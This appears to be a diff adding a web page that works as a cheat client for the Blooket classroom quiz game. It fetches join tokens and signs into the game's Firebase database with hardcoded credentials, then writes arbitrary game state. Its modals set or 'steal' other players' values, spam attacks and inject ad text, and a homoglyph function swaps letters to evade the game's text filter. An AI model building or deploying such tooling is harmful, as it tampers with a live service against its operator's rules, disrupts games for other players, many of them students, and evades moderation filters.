+		gameContainer.appendChild(msg);
+	} else {
+		gameCheats.forEach(c => gameContainer.appendChild(mkEl(c)));
+	}
+
+	if (globalContainer) global.forEach(c => globalContainer.appendChild(mkEl(c)));
+}
+
+function finishG() {
+	const gc = document.getElementById('game-container');
+	if (gc) gc.remove();
+
+	// Restore header
+	const header = document.getElementById('main-header');
+	if (header) {
+		header.className = '_header_mbghk_1';
+		header.style.cssText = '';
+		header.innerHTML = `
+			<div class="_leftContainer_mbghk_18">
+				<a class="page_headerLogo__UTJ26" href="https://blooket.com">Blooket</a>
+			</div>
+			<div class="_centerContainer_mbghk_26">Join a Game</div>
+			<div class="_rightContainer_mbghk_19">
+				<a class="page_headerLink__LsgSE" href="https://dashboard.blooket.com">Dashboard</a>
+			</div>`;
+	}
+
+	// Show forms again
+	const bg = document.querySelector('._background_l90pt_1');
+	if (bg) bg.style.display = '';
+	const floatingBlooks = document.getElementById('floating-blooks');
+	if (floatingBlooks) floatingBlooks.style.display = '';
+	const joinForm = document.getElementById('join-form');
+	if (joinForm) joinForm.style.display = '';
+	const nickForm = document.getElementById('nickname-form');
+	if (nickForm) nickForm.style.display = 'none';
+	const menu = document.getElementById('cheat-menu');
+	if (menu) menu.style.display = '';
+
+	errorBar("Game Ended!");
+}
+
+function createInp(text, action) {
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			var inp = document.createElement("input");
+			inp.className = "modal-input";
+			inp.placeholder = "Enter value...";
+			modal.appendChild(inp);
+			inp.focus();
+			var confirm = document.createElement("button");
+			confirm.className = "modal-confirm-btn";
+			confirm.textContent = "Apply";
+			confirm.addEventListener("click", function() { action(inp.value); closeModal(); });
+			inp.addEventListener("keydown", function(e) { if(e.key==="Enter"){action(inp.value);closeModal();} });
+			modal.appendChild(confirm);
+		});
+	});
+	return btn;
+}
+
+function buildPlayerList(modal, players, onSelect) {
+	var list = document.createElement("div");
+	list.className = "modal-player-list";
+	var selected = { v: null, el: null };
+	players.sort().forEach(function(name) {
+		var pdata = gameobject?.c?.[name];
+		var val = playerValue(pdata);
+		var blook = pdata?.b ?? '';
+		var row = document.createElement("div");
+		row.className = "modal-player-row";
+		var img = document.createElement("img");
+		img.className = "modal-player-img";
+		img.src = blook ? blookToUrl(blook) : '';
+		img.alt = blook;
+		img.onerror = function() { this.style.opacity='0.15'; };
+		var nameSpan = document.createElement("span");
+		nameSpan.className = "modal-player-name";
+		nameSpan.textContent = name;
+		row.appendChild(img);
+		row.appendChild(nameSpan);
+		if (val !== null) {
+			var valSpan = document.createElement("span");
+			valSpan.className = "modal-player-val";
+			valSpan.textContent = Number(val).toLocaleString();
+			row.appendChild(valSpan);
+		}
+		row.addEventListener("click", function() {
+			if (selected.el) selected.el.classList.remove('selected');
+			row.classList.add('selected');
+			selected.v = name; selected.el = row;
+			if (onSelect) onSelect(name, selected);
+		});
+		list.appendChild(row);
+	});
+	modal.appendChild(list);
+	return selected;
+}
+
+//cpval is computed value function, call it to compute select options in array form
+function createSel(text, cpval, action) {
+	const needsAmount = /steal|set player/i.test(text);
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			var players = Object.keys(gameobject?.c || {});
+			if (!players.length) {
+				var msg = document.createElement("div");
+				msg.style.cssText = "color:#aaa;font-size:14px;text-align:center;padding:12px;";
+				msg.textContent = "No players found";
+				modal.appendChild(msg);
+				return;
+			}
+			if (needsAmount) {
+				var selected = buildPlayerList(modal, players, null);
+				var amtRow = document.createElement("div");
+				amtRow.className = "modal-amount-row";
+				var amtInp = document.createElement("input");
+				amtInp.className = "modal-input";
+				amtInp.placeholder = "Amount...";
+				amtInp.type = "number";
+				var confirmBtn = document.createElement("button");
+				confirmBtn.className = "modal-confirm-btn";
+				confirmBtn.textContent = "Apply";
+				confirmBtn.addEventListener("click", function() {
+					if (!selected.v) return;
+					window._modalAmt = amtInp.value;
+					action(selected.v);
+					closeModal();
+				});
+				amtInp.addEventListener("keydown", function(e) { if(e.key==="Enter") confirmBtn.click(); });
+				amtRow.appendChild(amtInp);
+				amtRow.appendChild(confirmBtn);
+				modal.appendChild(amtRow);
+			} else {
+				buildPlayerList(modal, players, function(name) { action(name); closeModal(); });
+			}
+		});
+	});
+	return btn;
+}
+
+function createAdText(text, playerSelect, action) {
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			var selected = { v: null };
+			if (playerSelect) {
+				var players = Object.keys(gameobject?.c || {});
+				if (players.length) selected = buildPlayerList(modal, players, null);
+				var lbl = document.createElement("div");
+				lbl.style.cssText = "font-size:11px;color:#aaa;font-weight:700;text-transform:uppercase;letter-spacing:0.6px;margin-top:8px;";
+				lbl.textContent = "Ad text (no colons)";
+				modal.appendChild(lbl);
+			}
+			var inp = document.createElement("input");
+			inp.className = "modal-input";
+			inp.placeholder = "Enter ad text...";
+			modal.appendChild(inp);
+			inp.focus();
+			var confirmBtn = document.createElement("button");
+			confirmBtn.className = "modal-confirm-btn";
+			confirmBtn.textContent = "Send";
+			confirmBtn.addEventListener("click", function() {
+				var txt = inp.value.replace(/:/g, '');
+				if (!txt) return;
+				playerSelect ? (selected.v && action(selected.v, txt)) : action(txt);
+				closeModal();
+			});
+			inp.addEventListener("keydown", function(e) { if(e.key==="Enter") confirmBtn.click(); });
+			modal.appendChild(confirmBtn);
+		});
+	});
+	return btn;
+}
+
+function createAttack(text, cpval, spam, action) {
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			var players = Object.keys(gameobject?.c || {});
+			var selected = buildPlayerList(modal, players, null);
+			var spamInp = null;
+			if (spam) {
+				var spamRow = document.createElement("div");
+				spamRow.className = "modal-amount-row";
+				spamInp = document.createElement("input");
+				spamInp.className = "modal-input";
+				spamInp.placeholder = "Times...";
+				spamInp.type = "number";
+				spamInp.value = "5";
+				spamRow.appendChild(spamInp);
+				modal.appendChild(spamRow);
+			}
+			var lbl = document.createElement("div");
+			lbl.style.cssText = "font-size:11px;color:#aaa;font-weight:700;text-transform:uppercase;letter-spacing:0.6px;margin-top:8px;";
+			lbl.textContent = "Attack type (rocket, inspect, pay...)";
+			modal.appendChild(lbl);
+			var atkInp = document.createElement("input");
+			atkInp.className = "modal-input";
+			atkInp.placeholder = "Attack...";
+			modal.appendChild(atkInp);
+			atkInp.focus();
+			var confirmBtn = document.createElement("button");
+			confirmBtn.className = "modal-confirm-btn";
+			confirmBtn.textContent = "Attack";
+			confirmBtn.addEventListener("click", function() {
+				if (!selected.v || !atkInp.value) return;
+				spam ? action(selected.v, atkInp.value, parseInt(spamInp?.value||5)) : action(selected.v, atkInp.value);
+				closeModal();
+			});
+			atkInp.addEventListener("keydown", function(e) { if(e.key==="Enter") confirmBtn.click(); });
+			modal.appendChild(confirmBtn);
+		});
+	});
+	return btn;
+}
+
+
+// ── Modal system ─────────────────────────────────────────────────────────────
+function showModal(title, buildFn) {
+	closeModal();
+
+	var overlay = document.createElement("div");
+	overlay.id = "cheat-modal-overlay";
+	overlay.addEventListener("click", function(e) {
+		if (e.target === overlay) closeModal();
+	});
+
+	var box = document.createElement("div");
+	box.id = "cheat-modal";
+
+	var header = document.createElement("div");
+	header.className = "modal-header";
+
+	var titleEl = document.createElement("div");
+	titleEl.className = "modal-title";
+	titleEl.textContent = title;
+
+	var closeBtn = document.createElement("button");
+	closeBtn.className = "modal-close";
+	closeBtn.textContent = "x";
+	closeBtn.addEventListener("click", closeModal);
+
+	header.appendChild(titleEl);
+	header.appendChild(closeBtn);
+	box.appendChild(header);
+
+	var body = document.createElement("div");
+	body.className = "modal-body";
+	box.appendChild(body);
+
+	overlay.appendChild(box);
+	document.body.appendChild(overlay);
+
+	buildFn(body);
+
+	// animate in
+	requestAnimationFrame(() => overlay.classList.add("visible"));
+}
+
+function closeModal() {
+	var el = document.getElementById("cheat-modal-overlay");
+	if (el) el.remove();
+}
+
+function showInfoModal(title, value) {
+	showModal(title, function(modal) {
+		var box = document.createElement("div");
+		box.style.cssText = "background:#f7f7f7;border-radius:12px;padding:14px 18px;font-size:18px;font-weight:800;color:#333;word-break:break-all;text-align:center;";
+		box.textContent = value;
+		modal.appendChild(box);
+	});
+}
+
+// ── Blook image helpers ──────────────────────────────────────────────────────
+function blookToUrl(name) {
+	// strip any ad-text spam that got appended after a colon
+	var clean = (name || '').split(':')[0].trim();
+	return 'https://ac.blooket.com/marketassets/blooks/' +
+		clean.toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '') + '.svg';
+}
+
+function playerValue(playerData) {
+	if (!playerData) return null;
+	const v = playerData.g ?? playerData.cr ?? playerData.d ?? playerData.xp ??
+	          playerData.ca ?? playerData.t ?? playerData.w ?? playerData.f ?? null;
+	return v !== null ? v : null;
+}
+
+function createStaticSel(text, vals, action) {
+	const isBlookSel = text === 'Set Blook';
+
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			if (isBlookSel) {
+				var search = document.createElement("input");
+				search.className = "modal-input";
+				search.placeholder = "Search blooks...";
+				search.style.marginBottom = "10px";
+				modal.appendChild(search);
+
+				var grid = document.createElement("div");
+				grid.className = "modal-blook-grid";
+
+				function renderGrid(filter) {
+					grid.innerHTML = '';
+					vals.filter(v => v.toLowerCase().includes(filter.toLowerCase())).forEach(v => {
+						var item = document.createElement("div");
+						item.className = "modal-blook-item";
+						item.title = v;
+
+						var img = document.createElement("img");
+						img.src = blookToUrl(v);
+						img.alt = v;
+						img.onerror = function() { this.style.opacity = '0.2'; };
+
+						var label = document.createElement("span");
+						label.textContent = v;
+
+						item.appendChild(img);
+						item.appendChild(label);
+						item.addEventListener("click", function() {
+							action(v);
+							closeModal();
+						});
+						grid.appendChild(item);
+					});
+				}
+
+				renderGrid('');
+				search.addEventListener("input", () => renderGrid(search.value));
+				modal.appendChild(grid);
+				search.focus();
+			} else {
+				// generic static select — show as scrollable list
+				var list = document.createElement("div");
+				list.className = "modal-player-list";
+				vals.sort().forEach(v => {
+					var row = document.createElement("div");
+					row.className = "modal-player-row";
+					row.style.justifyContent = "center";
+					row.textContent = v;
+					row.addEventListener("click", function() {
+						action(v);
+						closeModal();
+					});
+					list.appendChild(row);
+				});
+				modal.appendChild(list);
+			}
+		});
+	});
+	return btn;
+}
+
+function createCsSel(text, vals, action) {
+	var btn = document.createElement("button");
+	btn.textContent = text;
+	btn.addEventListener("click", function() {
+		showModal(text, function(modal) {
+			var list = document.createElement("div");
+			list.className = "modal-player-list";
+			vals.forEach(function(v) {
+				var row = document.createElement("div");
+				row.className = "modal-player-row";
+				row.style.justifyContent = "center";
+				row.textContent = v?.name ?? v;
+				row.addEventListener("click", function() {
+					action(v?.value ?? v);
+					closeModal();
+				});
+				list.appendChild(row);
+			});
+			modal.appendChild(list);
+		});
+	});
+	return btn;
+}
+
+function findGameCode(str) {
+	const regex = /\b\d{7}\b/;
+	const match = str.match(regex);
+	if (match) {
+		return match[0];
+	} else {
+		return null;
+	}
+}
+async function genToken(gid, name) {
+	const { fbToken, fbShardURL } = await fetch(`${JOIN_URL}?g=${gid}`, {
+		method: "POST",
+		headers: { "Content-Type": "application/json" },
+		body: JSON.stringify({ id: gid, name, amount: 1 }),
+	}).then(e => e.json());
+	return {
+		gid,
+		name,
+		fbToken,
+		fbShardURL,
+	};
+}
+async function useToken(token) {
+	const { gid, name, fbToken, fbShardURL } = token;
+	await connect(
+		gid,
+		name,
+		document.getElementById("icogmode").getAttribute("checked"),
+		{
+			success: !0,
+			fbShardURL,
+			fbToken,
+		}
+	);
+}
+
+function recoverInfoFromFbToken(fbToken) {
+	return JSON.parse(atob(token.split(".")[1]));
+}
+
+function addChatMessage(a) { /* chat removed */ }
+//CHECKMARK CODE
+document.querySelectorAll("checkbox").forEach((e) => {
+	e.addEventListener("click", function () {
+		if (e.getAttribute("checked")) {
+			e.removeAttribute("checked");
+		} else {
+			e.setAttribute("checked", "true");
+		}
+	});
+});
+//END OF CHECKMARK CODE
+function genMessage(msg, amt) {
+	var t = "";
+	for (var i = 0; i < amt; i++) {
+		t += msg + " ";
+	}
+	return t;
+}
+//firebase code
+async function connect(gid, name, icog, reqbody = !1) {
+	botinfo.connected = false;
+	botinfo.connecting = true;
+	botinfo.name = name;
+	botinfo.gid = gid;
+	updateStatus("Fetching token...");
+	const body = reqbody
+		? reqbody
+		: await fetch(`${JOIN_URL}?g=${gid}`, {
+			method: "POST",
+			headers: { "Content-Type": "application/json" },
+			body: JSON.stringify({ id: gid, name, amount: 1 }),
+		}).then(e => e.json());
+	updateStatus("Connecting to game...");
+	if (body.success) {
+		const liveApp = initializeApp(
+			{
+				apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+				authDomain: "blooket-2020.firebaseapp.com",
+				projectId: "blooket-2020",
+				storageBucket: "blooket-2020.appspot.com",
+				messagingSenderId: "741533559105",
+				appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
+				measurementId: "G-S3H5NGN10Z",
+				databaseURL: body.fbShardURL,
+			},
+			Date.now().toString()
+		);
+		const auth = getAuth(liveApp);
+		await signInWithCustomToken(auth, body.fbToken);
+		const db = getDatabase(liveApp);
+		await set(ref(db, `${gid}/c/${name}`), {
+			b: fblooks[Math.floor(Math.random() * fblooks.length)],
+		});
+		botinfo.fbdb = db;
+		botinfo.liveApp = liveApp;
+		botinfo.connecting = false;
+		botinfo.connected = true;
+		updateStatus("Connected to game");
+		onValue(ref(db, `${gid}`), (data) => {
+			if (!botinfo.connected) {
+				return;
+			}
+			onUpdateData(data.val());
+		});
+		onValue(ref(db, `${gid}/bu`), (data) => {
+			if (!botinfo.connected) {
+				return;
+			}
+			onBlock(data.val());
+		});
+	} else {
+		updateStatus("Ready");
+		botinfo.connecting = false;
+		errorBar("Connect error: " + body.msg);
+	}
+}
+
+function bypassFilter(str) {
+	return str
+		.replace(/a/g, "\u0430")
+		.replace(/c/g, "\u0441")
+		.replace(/e/g, "\u0435")
+		.replace(/i/g, "\u0456")
+		.replace(/j/g, "\u0458")
+		.replace(/o/g, "\u043E")
+		.replace(/p/g, "\u0440")
+		.replace(/s/g, "\u0455")
+		.replace(/x/g, "\u0445")
+		.replace(/y/g, "\u0443")
+		.replace(/A/g, "\u0410")
+		.replace(/B/g, "\u0412")
+		.replace(/C/g, "\u0421")
+		.replace(/E/g, "\u0415")
+		.replace(/H/g, "\u041D")
+		.replace(/I/g, "\u0406")
+		.replace(/K/g, "\u039A")
+		.replace(/M/g, "\u041C")
+		.replace(/N/g, "\u039D")
+		.replace(/O/g, "\u041E")
+		.replace(/P/g, "\u0420")
+		.replace(/S/g, "\u0405")
+		.replace(/T/g, "\u0422")
+		.replace(/X/g, "\u0425")
+		.replace(/Y/g, "\u03A5")
+		.replace(/Z/g, "\u0396")
+		.replace(/!/g, "\u01C3")
+		.replace(/\./g, "\u2024")
+		.replace(/;/g, "\u037E")
+		.replace(/,/g, "\u201A")
+		.replace(/-/g, "\u2010");
+}
+
+async function setVal(path, val) {
+	if (!botinfo.connected) {
+		errorBar("Cannot set value while disconnected!");
+		return;
+	}
+	if (!botinfo.fbdb) {
+		errorBar("Cannot set value when there is no game!");
+		return;
+	}
+	await set(ref(botinfo.fbdb, path), val);
+}
+
+async function setUserVal(path, val) {
+	const safeVal = coerceValue(val);
+	console.log(path, safeVal, typeof safeVal);
+	await setVal(`/${botinfo.gid}/c/${botinfo.name}/${path}`, safeVal);
+}
+
+updateStatus("Ready");
+
+
+
+// Pre-populate global buttons so panel isn't empty before joining
+window.addEventListener('DOMContentLoaded', () => renderCheats('Unknown'));
+
+    </script>
+    <script>
+        // M key toggles cheat panel
+        document.addEventListener('keydown', e => {
+            if (e.key === 'm' || e.key === 'M') {
+                // don't trigger if typing in an input
+                if (document.activeElement.tagName === 'INPUT') return;
+                document.getElementById('cheat-panel').classList.toggle('open');
+            }
+        });
+
+        // Form handling
+        let loadingInterval;
+        let loadingCount = 1;
+        let gameCode = '';
+
+        document.getElementById('submit-id').addEventListener('click', () => {
+            gameCode = document.getElementById('game-id').value;
+            if (!gameCode) return;
+            document.getElementById('join-form').style.display = 'none';
+            document.getElementById('nickname-form').style.display = 'flex';
+        });
+
+        document.getElementById('submit-nickname').addEventListener('click', () => {
+            const nickname = document.getElementById('nickname').value;
+            if (!nickname) return;
+
+            loadingInterval = setInterval(() => {
+                loadingCount++;
+                document.getElementById('loading-text').textContent = `Loading (${loadingCount})`;
+            }, 1000);
+
+            window.stopLoadingCounter = () => {
+                if (loadingInterval) { clearInterval(loadingInterval); loadingInterval = null; }
+            };
+
+            if (window.joinGame) window.joinGame(gameCode, nickname);
+        });
+
+        document.getElementById('game-id').addEventListener('keydown', e => {
+            if (e.key === 'Enter') { e.preventDefault(); document.getElementById('submit-id').click(); }
+        });
+        document.getElementById('nickname').addEventListener('keydown', e => {
+            if (e.key === 'Enter') { e.preventDefault(); document.getElementById('submit-nickname').click(); }
+        });
+    </script>
+</body>
+</html>
+
+
